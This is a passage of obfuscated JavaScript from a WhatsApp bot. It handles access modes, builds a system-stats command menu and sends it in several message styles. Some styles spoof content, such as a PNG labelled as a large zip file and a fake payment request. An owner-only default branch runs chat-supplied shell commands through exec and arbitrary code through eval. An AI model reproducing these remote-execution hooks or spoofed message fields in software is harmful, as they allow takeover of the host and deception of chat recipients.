      if (_0x22a65d && !_0xd55e86 && !_0x4421c3.key.fromMe) {
        return;
      }
    }
    if (global.mode === "private") {
      if (_0x22a65d && !_0xd55e86 && !_0x4421c3.key.fromMe) {
        return;
      }
    } else {
      if (global.mode === "group") {
        if (_0x22a65d && !_0x4421c3.isGroup && !_0xd55e86 && !_0x4421c3.key.fromMe) {
          return;
        }
      } else {
        if (global.mode === 'pm') {
          if (_0x22a65d && _0x4421c3.isGroup && !_0xd55e86 && !_0x4421c3.key.fromMe) {
            return;
          }
        }
      }
    }
    const _0x255360 = global.mode === 'public' ? "Public" : global.mode === "private" ? "Private" : global.mode === "group" ? "Group Only" : global.mode === 'pm' ? "PM Only" : 'Unknown';
    const _0x14c2e5 = {
      'key': {
        'participants': "0@s.whatsapp.net",
        'remoteJid': 'status@broadcast',
        'fromMe': false,
        'id': "Halo"
      },
      'message': {
        'contactMessage': {
          'vcard': "BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:y\nitem1.TEL;waid=" + _0x4421c3.sender.split('@')[0x0] + ':' + _0x4421c3.sender.split('@')[0x0] + "\nitem1.X-ABLabel:Ponsel\nEND:VCARD"
        }
      },
      'participant': "0@s.whatsapp.net"
    };
    (async () => {
      if (_0x22a65d) {
        try {} catch (_0x23179b) {
          console.error("Error executing command:", _0x23179b.message);
          _0x3ea047.sendMessage(_0x3ea047.user.id, {
            'text': "An error occurred while executing the command: " + _0x23179b.message
          });
        }
      }
    })();
    switch (_0x22a65d) {
      case "menu":
        const _0x4a5bd0 = (_0x156b84, _0x4f238f, _0x1f95f3, _0x1dd41e, _0x270f65, _0x3dc507, _0xfbf71) => {
          const _0xf22885 = process.memoryUsage();
          const _0x43b081 = _0xf22885.heapUsed;
          const _0x23e2c6 = os.totalmem();
          const _0x37d256 = _0x23e2c6 - os.freemem();
          const _0x3e9917 = (_0x3be6ac, _0xaf4b2d, _0x5081ce = 0xa) => {
            let _0x19e062 = Math.round(_0x3be6ac / _0xaf4b2d * _0x5081ce);
            let _0x586600 = '█'.repeat(_0x19e062) + '░'.repeat(_0x5081ce - _0x19e062);
            return '[' + _0x586600 + "] " + Math.round(_0x3be6ac / _0xaf4b2d * 0x64) + '%';
          };
          let _0x22c6b2 = 0x0;
          const _0x4c6d93 = new Set();
          for (const _0x5a9234 in _0x156b84) {
            _0x156b84[_0x5a9234].forEach(_0xb480e9 => {
              if (_0xb480e9.command.length > 0x0) {
                _0x4c6d93.add(_0xb480e9.command[0x0]);
              }
            });
          }
          _0x22c6b2 = _0x4c6d93.size;
          let _0x207b46 = "┏▣ ◈ *SPARKY BOT GROUP* ◈\n";
          _0x207b46 += "┃ *ᴏᴡɴᴇʀ* : " + _0x4f238f + "\n";
          _0x207b46 += "┃ *ᴘʀᴇғɪx* : [ " + _0x1f95f3 + " ]\n";
          _0x207b46 += "┃ *ʜᴏsᴛ* : " + os.platform() + "\n";
          _0x207b46 += "┃ *ᴘʟᴜɢɪɴs* : " + _0x22c6b2 + "\n";
          _0x207b46 += "┃ *ᴍᴏᴅᴇ* : " + _0x1dd41e + "\n";
          _0x207b46 += "┃ *ᴠᴇʀsɪᴏɴ* : " + _0x270f65 + "\n";
          _0x207b46 += "┃ *sᴘᴇᴇᴅ* : " + _0x3dc507.toFixed(0x4) + " ms\n";
          _0x207b46 += "┃ *ᴜsᴀɢᴇ* : " + (_0x43b081 < 1073741824 ? Math.round(_0x43b081 / 0x400 / 0x400) + " MB" : Math.round(_0x43b081 / 0x400 / 0x400 / 0x400) + " GB") + " of " + (_0x23e2c6 < 1073741824 ? Math.round(_0x23e2c6 / 0x400 / 0x400) + " MB" : Math.round(_0x23e2c6 / 0x400 / 0x400 / 0x400) + " GB") + "\n";
          _0x207b46 += "┃ *ʀᴀᴍ:* " + _0x3e9917(_0x37d256, _0x23e2c6) + "\n";
          _0x207b46 += "┗▣ \n" + _0xfbf71 + "\n";
          for (const _0x57fe64 in _0x156b84) {
            _0x207b46 += "┏▣ ◈  *" + _0x57fe64.toUpperCase() + " MENU* ◈\n";
            _0x156b84[_0x57fe64].forEach(_0x21e1b5 => {
              if (_0x21e1b5.command.length > 0x0) {
                _0x207b46 += "│➽ " + _0x21e1b5.command[0x0] + "\n";
              }
            });
            _0x207b46 += "┗▣ \n\n";
          }
          return _0x207b46;
        };
        const _0xc8a22d = _0x181ea3 => {
          const _0x17e3b1 = {};
          const _0x313db0 = fs.readdirSync(_0x181ea3);
          _0x313db0.forEach(_0x4bba19 => {
            if (_0x4bba19.endsWith('.js')) {
              const _0x5472d0 = path.join(_0x181ea3, _0x4bba19);
              try {
                delete require.cache[require.resolve(_0x5472d0)];
                const _0x1ef9e4 = require(_0x5472d0);
                const _0x1f1d98 = path.basename(_0x4bba19, '.js');
                if (!_0x17e3b1[_0x1f1d98]) {
                  _0x17e3b1[_0x1f1d98] = [];
                }
                _0x17e3b1[_0x1f1d98].push(..._0x1ef9e4);
              } catch (_0x31f1bc) {
                console.error("Error loading plugin at " + _0x5472d0 + ':', _0x31f1bc);
              }
            }
          });
          return _0x17e3b1;
        };
        const _0x3fd40f = [tylorkid1, tylorkid2, tylorkid3, tylorkid4, tylorkid5][Math.floor(Math.random() * 0x5)];
        const _0x598bdb = performance.now();
        await _0x4421c3.reply("Loading menu...");
        const _0x16a398 = performance.now();
        const _0x4844ee = _0x16a398 - _0x598bdb;
        const _0x3e7921 = _0xc8a22d(path.resolve(__dirname, './src/Plugins'));
        const _0x110ac4 = _0x4a5bd0(_0x3e7921, ownername, prefixz, _0x255360, versions, _0x4844ee, readmore);
        if (menustyle === '1') {
          _0x3ea047.sendMessage(_0x4421c3.chat, {
            'document': {
              'url': "https://i.ibb.co/2W0H9Jq/avatar-contact.png"
            },
            'caption': _0x110ac4,
            'mimetype': "application/zip",
            'fileName': '' + botname,
            'fileLength': "9999999",
            'contextInfo': {
              'externalAdReply': {
                'showAdAttribution': true,
                'title': '',
                'body': '',
                'thumbnail': _0x3fd40f,
                'sourceUrl': plink,
                'mediaType': 0x1,
                'renderLargerThumbnail': true
              }
            }
          }, {
            'quoted': _0x14c2e5
          });
        } else {
          if (menustyle === '2') {
            _0x4421c3.reply(_0x110ac4);
          } else {
            if (menustyle === '3') {
              _0x3ea047.sendMessage(_0x4421c3.chat, {
                'text': _0x110ac4,
                'contextInfo': {
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'title': botname,
                    'body': ownername,
                    'thumbnail': _0x3fd40f,
                    'sourceUrl': plink,
                    'mediaType': 0x1,
                    'renderLargerThumbnail': true
                  }
                }
              }, {
                'quoted': _0x4421c3
              });
            } else {
              if (menustyle === '4') {
                _0x3ea047.sendMessage(_0x4421c3.chat, {
                  'image': _0x3fd40f,
                  'caption': _0x110ac4
                }, {
                  'quoted': _0x4421c3
                });
              } else {
                if (menustyle === '5') {
                  let _0x26c60c = generateWAMessageFromContent(_0x4421c3.chat, {
                    'viewOnceMessage': {
                      'message': {
                        'interactiveMessage': {
                          'body': {
                            'text': null
                          },
                          'footer': {
                            'text': _0x110ac4
                          },
                          'nativeFlowMessage': {
                            'buttons': [{
                              'text': null
                            }]
                          }
                        }
                      }
                    }
                  }, {
                    'quoted': _0x4421c3
                  });
                  _0x3ea047.relayMessage(_0x4421c3.chat, _0x26c60c.message, {
                    'messageId': _0x26c60c.key.id
                  });
                } else if (menustyle === '6') {
                  _0x3ea047.relayMessage(_0x4421c3.chat, {
                    'requestPaymentMessage': {
                      'currencyCodeIso4217': "USD",
                      'requestFrom': '0@s.whatsapp.net',
                      'amount1000': '1',
                      'noteMessage': {
                        'extendedTextMessage': {
                          'text': _0x110ac4,
                          'contextInfo': {
                            'mentionedJid': [_0x4421c3.sender],
                            'externalAdReply': {
                              'showAdAttribution': true
                            }
                          }
                        }
                      }
                    }
                  }, {});
                }
              }
            }
          }
        }
        break;
      default:
        {
          if (_0x3d3256.startsWith('$')) {
            if (!_0xd55e86) {
              return;
            }
            exec(_0x3d3256.slice(0x2), (_0x8c29ec, _0x3ad5f2) => {
              if (_0x8c29ec) {
                return _0x4421c3.reply(_0x8c29ec);
              }
              if (_0x3ad5f2) {
                return _0x4421c3.reply(_0x3ad5f2);
              }
            });
          }
          if (_0x3d3256.startsWith('>')) {
            if (!_0xd55e86) {
              return;
            }
            try {
              let _0x5abe88 = await eval(_0x3d3256.slice(0x2));
              if (typeof _0x5abe88 !== "string") {
                _0x5abe88 = require("util").inspect(_0x5abe88);
              }
              await _0x4421c3.reply(_0x5abe88);
            } catch (_0x14cf65) {
              console.error(_0x14cf65);
              await _0x4421c3.reply(String(_0x14cf65));
            }
          }
          if (_0x3d3256.startsWith('=>')) {
            if (!_0xd55e86) {
              return;
            }
            try {
              const _0x5ae649 = await eval("(async () => { return " + _0x3d3256.slice(0x3) + " })()");
              _0x4421c3.reply(util.format(_0x5ae649));
            } catch (_0x2b93ee) {
              console.error(_0x2b93ee);
              _0x4421c3.reply(String(_0x2b93ee));
            }
          }
        }
    }
  } catch (_0xb9e210) {
    let _0x10336c = util.format(_0xb9e210);
    let _0x5638db = String(_0x10336c);
    if (shouldLogError(_0x5638db)) {
      if (typeof _0xb9e210 === 'string') {
        _0x4421c3.reply("An error occurred:\n\nError Description: " + _0x5638db);
      } else {
        console.log(_0x10336c);
        _0x3ea047.sendMessage(_0x3ea047.user.id, {
          'text': "An error occurred:\n\nError Description: " + _0x5638db,
          'contextInfo': {
            'forwardingScore': 0x98967f,
            'isForwarded': true
          }
        }, {
          'ephemeralExpiration': 0x3c
        });
      }
      recordError(_0x5638db);
    } else {
      console.log("Repeated error suppressed: " + _0x5638db);
    }
  }
};
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(color("Updated '" + __filename + "'", 'red'));
  delete require.cache[file];
  require(file);
});